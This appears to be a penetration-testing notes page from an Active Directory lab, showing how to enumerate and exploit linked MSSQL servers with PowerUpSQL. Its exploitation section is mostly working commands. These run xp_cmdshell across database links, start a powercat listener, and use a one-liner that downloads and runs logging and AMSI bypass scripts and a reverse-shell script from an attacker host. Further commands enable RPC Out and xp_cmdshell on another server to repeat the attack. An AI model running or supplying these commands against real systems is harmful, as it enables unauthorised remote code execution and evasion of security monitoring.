# MSSQL

## Enumeration

Use PowerupSQL to enumerate for any database in the domain

```powershell
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

<figure><img src="https://github.com/italianpenty/WriteUps/raw/main/.gitbook/assets/image%20(19).png" alt=""><figcaption></figcaption></figure>

So we have non-sysadmin access to us-mssql. Let's enumerate database links for us-mssql:

```powershell
Get-SQLServerLink -Instance <$Target> -Verbose
```

<figure><img src="https://github.com/italianpenty/WriteUps/raw/main/.gitbook/assets/image%20(20).png" alt=""><figcaption></figcaption></figure>

Use Get-SQLServerLinkCrawl from PowerUpSQL for crawling the database links automatically:

```powershell
Get-SQLServerLinkCrawl -Instance <$Target> -Verbose
```

<figure><img src="https://github.com/italianpenty/WriteUps/raw/main/.gitbook/assets/image%20(21).png" alt=""><figcaption></figcaption></figure>

## Exploitation

If xp\_cmdshell is enabled (or rpcout is true that allows us to enable xp\_cmdshell), it is possible to execute commands on any node in the database links using the below commands.

{% code overflow="wrap" %}
```powershell
Get-SQLServerLinkCrawl -Instance <$Target> -Query 'exec master..xp_cmdshell ''whoami'''
```
{% endcode %}

<figure><img src="https://github.com/italianpenty/WriteUps/raw/main/.gitbook/assets/image%20(22).png" alt=""><figcaption></figcaption></figure>

Invoke a reverse shell. Host a listener with powercat

```
. .\powercat.ps1
powercat -l -v -p 443 -t 1000
```

{% code overflow="wrap" %}
```powershell
Get-SQLServerLinkCrawl -Instance <$target> -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.64/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.64/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.64/Invoke-PowerShellTcpEx.ps1)"'''
```
{% endcode %}

<figure><img src="https://github.com/italianpenty/WriteUps/raw/main/.gitbook/assets/image%20(23).png" alt=""><figcaption></figcaption></figure>

### Enable RPC Out

Because the link from DB-SQLProd to DB-SQLSrv is configured to use sa. We can enable RPC Out and xp\_cmdshell on DB-SQLSrv! Run the below commands on the reverse shell we got above.

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">Invoke-SqlCmd -Query "exec sp_serveroption @server='&#x3C;$Target>', @optname='rpc', @optvalue='TRUE'"
Invoke-SqlCmd -Query "exec sp_serveroption @server='&#x3C;$Target>', @optname='rpc out', @optvalue='TRUE'"
Invoke-SqlCmd -Query "EXECUTE ('sp_configure ''show advanced options'',1;reconfigure;') AT ""&#x3C;$Target>"""
<strong>Invoke-SqlCmd -Query "EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure') AT ""&#x3C;$Target>"""
</strong></code></pre>

and now launch a reverse shell again on the other server

{% code overflow="wrap" %}
```
Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://<$IP>/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://<$IP>/amsibypass.txt);iex (iwr -UseBasicParsing http:/<$IP>/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget <$Target>
```
{% endcode %}

<figure><img src="https://github.com/italianpenty/WriteUps/raw/main/.gitbook/assets/image%20(24).png" alt=""><figcaption></figcaption></figure>

\
